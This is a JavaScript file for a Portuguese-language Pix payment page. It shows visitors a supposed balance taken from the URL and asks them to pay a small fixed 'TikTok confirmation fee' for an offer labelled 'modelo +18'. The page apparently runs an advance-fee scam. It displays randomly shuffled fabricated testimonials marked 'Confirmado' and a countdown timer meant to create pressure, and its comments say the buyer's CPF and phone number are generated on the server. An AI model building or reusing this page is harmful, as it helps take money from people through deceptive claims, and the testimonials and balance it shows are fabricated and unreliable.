(function(){
  var params = new URLSearchParams(window.location.search);
  var totalParam = parseFloat(params.get('total')) || 868.75;
  var taxaParam = 13.92; // fixo
  var emailParam = params.get('email') || '';

  function fmtBRL(v){ return 'R$ '+v.toFixed(2).replace('.',','); }
  function fmtBRLShort(v){ return 'R$'+v.toFixed(2).replace('.',','); }

  document.getElementById('saldoValue').textContent   = fmtBRLShort(totalParam);
  document.getElementById('saldoBadge').textContent   = fmtBRLShort(totalParam);
  document.getElementById('priceConfirm').textContent = fmtBRL(taxaParam);
  document.getElementById('priceTotal').textContent   = fmtBRL(taxaParam);
  document.getElementById('priceModal').textContent   = fmtBRL(taxaParam);
  document.getElementById('priceStep').textContent    = fmtBRL(taxaParam);

  if(emailParam) document.getElementById('inputEmail').value = emailParam;

  var taxaCentavos = Math.round(taxaParam * 100);

  var allDepos = [
    {av:'AC',bg:'#e05252',txt:'"Caiu na hora no meu Nubank, sem erro nenhum."'},
    {av:'RO',bg:'#00b37e',txt:'"Paguei e recebi em menos de 2 minutos."'},
    {av:'JM',bg:'#5a6fd6',txt:'"Funcionou certinho, sem nenhum problema."'},
    {av:'LS',bg:'#f59e0b',txt:'"Super rápido, recomendo pra todo mundo."'},
    {av:'BF',bg:'#8b5cf6',txt:'"Na primeira tentativa já funcionou."'},
    {av:'CM',bg:'#ec4899',txt:'"Processo simples e seguro. Aprovado!"'},
  ];
  function renderDepos(){
    var shuffled = allDepos.sort(function(){return Math.random()-.5;}).slice(0,3);
    document.getElementById('miniDepos').innerHTML = shuffled.map(function(d){
      return '<div class="mini-depo"><div class="mini-depo-av" style="background:'+d.bg+'">'+d.av+'</div>'+
             '<span class="mini-depo-text">'+d.txt+'</span>'+
             '<span class="mini-depo-check">✓ Confirmado</span></div>';
    }).join('');
  }
  renderDepos();

  var PIX_CODE='', PAYMENT_CODE='', pollingInterval=null, timerInterval=null;
  var TOTAL_SECONDS=10*60, remainingSeconds=TOTAL_SECONDS;

  function pad(n){return String(n).padStart(2,'0');}

  function getLeadId(){
    try{
      var ck=document.cookie.split(';').find(function(c){return c.trim().startsWith('xtracky_lead=');});
      if(ck) return ck.split('=')[1].trim();
    }catch(e){}
    return params.get('utm_source')||'';
  }



  var toastTimeout;
  function showToast(msg){
    var el=document.getElementById('toast');
    document.getElementById('toastMsg').textContent=msg;
    clearTimeout(toastTimeout);
    el.classList.remove('show');
    setTimeout(function(){el.classList.add('show');toastTimeout=setTimeout(function(){el.classList.remove('show');},3000);},10);
  }

  document.getElementById('tabQr').addEventListener('click',function(){
    document.getElementById('tabQr').classList.add('active');document.getElementById('tabCopy').classList.remove('active');
    document.getElementById('panelQr').classList.add('active');document.getElementById('panelCopy').classList.remove('active');
  });
  document.getElementById('tabCopy').addEventListener('click',function(){
    document.getElementById('tabCopy').classList.add('active');document.getElementById('tabQr').classList.remove('active');
    document.getElementById('panelCopy').classList.add('active');document.getElementById('panelQr').classList.remove('active');
  });

  function startTimer(){
    var countEl=document.getElementById('timerCount'), barEl=document.getElementById('timerBar');
    remainingSeconds=TOTAL_SECONDS;
    if(timerInterval) clearInterval(timerInterval);
    timerInterval=setInterval(function(){
      remainingSeconds--;
      if(remainingSeconds<=0){remainingSeconds=0;clearInterval(timerInterval);}
      var m=Math.floor(remainingSeconds/60),s=remainingSeconds%60;
      countEl.textContent=pad(m)+':'+pad(s);
      var urgent=remainingSeconds<300;
      countEl.classList.toggle('urgent',urgent);barEl.classList.toggle('urgent',urgent);
      barEl.style.width=(remainingSeconds/TOTAL_SECONDS*100)+'%';
    },1000);
  }

  function startPolling(paymentCode, nome, email){
    if(pollingInterval) clearInterval(pollingInterval);
    pollingInterval=setInterval(function(){
      fetch('/api/payment-status?tx='+encodeURIComponent(paymentCode),{cache:'no-store'})
        .then(function(r){return r.json();})
        .then(function(data){
          if(data.paid===true || data.status==='approved'){
            clearInterval(pollingInterval);
            trackTikTokPayment(paymentCode);
            showSuccessScreen();
            var obrigadoUrl=data.obrigado_url||'../up1/index.html';
            var dest=new URL(obrigadoUrl,window.location.href);
            params.forEach(function(v,k){dest.searchParams.set(k,v);});
            var destStr=dest.toString();
            // Manda eventos e aguarda antes de redirecionar
            setTimeout(function(){window.location.href=destStr;},2000);
          }
        }).catch(function(){});
    },5000);
  }

  function trackTikTokPayment(paymentCode){
    var eventKey='tiktok_complete_payment_'+paymentCode;
    try{
      if(sessionStorage.getItem(eventKey)) return;
      sessionStorage.setItem(eventKey,'1');
    }catch(e){}
    if(typeof ttq!=='undefined' && typeof ttq.track==='function'){
      try{ttq.track('CompletePayment',{content_type:'pix_fee',value:taxaParam,currency:'BRL'});}catch(e){}
    }
  }

  function showSuccessScreen(){
    document.querySelector('.modal').innerHTML='<div style="padding:40px 20px;text-align:center">'+
      '<div style="width:64px;height:64px;border-radius:50%;background:#e6faf4;border:2.5px solid #00b37e;display:flex;align-items:center;justify-content:center;margin:0 auto 16px">'+
      '<svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="#00b37e" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>'+
      '</div><h2 style="font-size:20px;font-weight:800;color:#111;margin-bottom:8px">Pagamento Confirmado!</h2>'+
      '<p style="font-size:14px;color:#888">Redirecionando em instantes...</p></div>';
  }

  function validarEmail(e){return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(e);}

  ['inputNome','inputEmail'].forEach(function(id){
    document.getElementById(id).addEventListener('blur',function(){
      if(id==='inputEmail'){if(!validarEmail(this.value.trim()))this.classList.add('error');else this.classList.remove('error');}
      else{if(this.value.trim().split(' ').filter(function(p){return p.length>0;}).length<2)this.classList.add('error');else this.classList.remove('error');}
    });
    document.getElementById(id).addEventListener('focus',function(){this.classList.remove('error');});
  });

  document.getElementById('btnPagar').addEventListener('click',function(){
    var nomeEl=document.getElementById('inputNome');
    var emailEl=document.getElementById('inputEmail');
    var nomeCompleto=nomeEl.value.trim();
    var email=emailEl.value.trim();
    var ok=true;

    [nomeEl,emailEl].forEach(function(el){el.classList.remove('error');});
    var nomePartes=nomeCompleto.split(/\s+/).filter(Boolean);
    if(nomePartes.length<2){nomeEl.classList.add('error');ok=false;}
    if(!validarEmail(email)){emailEl.classList.add('error');ok=false;}
    if(!ok){
      showToast('👆 Preencha nome e e-mail corretamente');
      var first=document.querySelector('.field input.error');
      if(first) first.scrollIntoView({behavior:'smooth',block:'center'});
      return;
    }

    // O CPF e o telefone são gerados no backend. O navegador envia somente
    // o nome e o e-mail digitados pelo comprador, sem campos adicionais.
    var saved=sessionStorage.getItem('pix_data_front');
    if(saved){
      try{
        var ps=JSON.parse(saved);
        if(ps.expires_at && Date.now()<ps.expires_at &&
           ps.email===email.toLowerCase() && ps.amount===taxaCentavos &&
           ps.payment_code && ps.pix_code){
          PAYMENT_CODE=ps.payment_code;
          PIX_CODE=ps.pix_code;
          openModal(nomeCompleto,email,ps);
          return;
        }
      }catch(e){}
      sessionStorage.removeItem('pix_data_front');
    }

    var btn=this;
    var text=btn.querySelector('.btn-text');
    btn.classList.add('loading');
    btn.disabled=true;
    text.textContent='Gerando PIX...';

    fetch('/api/generate_qr_gateway',{
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify({
        name:nomeCompleto,
        email:email,
        amount:taxaCentavos,
        description:'Taxa de Confirmacao TikTok',
        offer:'modelo +18',
        source:'api_externa',
        utm:window.location.search.replace(/^\?/, '')
      })
    })
    .then(function(response){
      return response.json().catch(function(){return {};}).then(function(data){
        if(!response.ok){
          throw new Error(data.error || 'Erro HTTP ' + response.status);
        }
        return data;
      });
    })
    .then(function(data){
      var paymentCode=data.payment_code || data.transactionId || data.transaction_id;
      var pixCode=data.pix_code || data.pixCode || data.qr_code || data.pix_copy_paste || '';
      if(data.error || !data.success || !paymentCode || !pixCode){
        throw new Error(data.error || 'A FlevoPay não retornou o código Pix.');
      }

      PAYMENT_CODE=String(paymentCode);
      PIX_CODE=String(pixCode);

      var leadJson=JSON.stringify({nome:nomeCompleto,email:email});
      try{
        sessionStorage.setItem('lead_data',leadJson);
        localStorage.setItem('lead_data',leadJson);
      }catch(e){}

      // Prazo local conservador de 10 minutos; o status é confirmado no servidor.
      var expiresAt=Date.now()+(10*60*1000);
      var pixCache={
        payment_code:PAYMENT_CODE,
        pix_code:PIX_CODE,
        expires_at:expiresAt,
        email:email.toLowerCase(),
        amount:taxaCentavos
      };
      sessionStorage.setItem('pix_data_front',JSON.stringify(pixCache));
      openModal(nomeCompleto,email,pixCache);
    })
    .catch(function(error){
      console.error('[FLEVOPAY PIX]',error);
      showToast('❌ ' + (error.message || 'Erro ao gerar PIX. Tente novamente.'));
    })
    .finally(function(){
      btn.classList.remove('loading');
      btn.disabled=false;
      text.textContent='Pagar Agora';
    });
  });

  function openModal(nomeCompleto,email,pixSaved){
    document.getElementById('nomeModal').textContent=nomeCompleto.split(' ')[0];
    var ed=new Date(pixSaved.expires_at);
    document.getElementById('expiryTime').textContent=pad(ed.getDate())+'/'+pad(ed.getMonth()+1)+'/'+ed.getFullYear()+' '+pad(ed.getHours())+':'+pad(ed.getMinutes())+':'+pad(ed.getSeconds());
    document.getElementById('pixCodeText').textContent=PIX_CODE||PAYMENT_CODE;
    var qrContainer=document.getElementById('qrContainer');
    qrContainer.innerHTML='';
    if(PIX_CODE){
      if(typeof QRCode==='undefined'){
        qrContainer.textContent='Não foi possível carregar o QR Code. Atualize a página.';
      }else{
        try{
          new QRCode(qrContainer,{text:PIX_CODE,width:180,height:180,colorDark:'#000000',colorLight:'#ffffff',correctLevel:QRCode.CorrectLevel.M});
        }catch(err){
          console.error('[pix-qr] Falha ao renderizar QR Code');
          qrContainer.textContent='Não foi possível gerar o QR Code. Use Copia e Cola.';
        }
      }
    }
    var remaining=Math.floor((pixSaved.expires_at-Date.now())/1000);
    TOTAL_SECONDS=remaining>0?remaining:600;
    document.getElementById('pixModal').classList.add('active');
    document.body.classList.add('modal-open');
    renderDepos();startTimer();startPolling(PAYMENT_CODE,nomeCompleto,email);
  }

  document.getElementById('modalClose').addEventListener('click',function(){
    if(pollingInterval){if(!confirm('Tem certeza? Seu pagamento ainda está sendo processado.'))return;clearInterval(pollingInterval);}
    document.getElementById('pixModal').classList.remove('active');document.body.classList.remove('modal-open');
    var btn=document.getElementById('btnPagar');btn.classList.remove('loading');btn.disabled=false;btn.querySelector('.btn-text').textContent='Pagar Agora';
  });
  document.getElementById('pixModal').addEventListener('click',function(e){
    if(e.target===this&&!pollingInterval){this.classList.remove('active');document.body.classList.remove('modal-open');}
  });

  function copiarPix(){
    var code=PIX_CODE||document.getElementById('pixCodeText').textContent;
    navigator.clipboard.writeText(code).then(function(){
      var btn=document.getElementById('btnCopiarPix');
      btn.classList.add('copied');
      btn.innerHTML='<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg> Código Copiado!';
      setTimeout(function(){btn.classList.remove('copied');btn.innerHTML='<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg> Copiar Código PIX';},2500);
    });
  }
  document.getElementById('btnCopiarPix').addEventListener('click',copiarPix);
  document.getElementById('copyCodeBtn').addEventListener('click',copiarPix);

})();
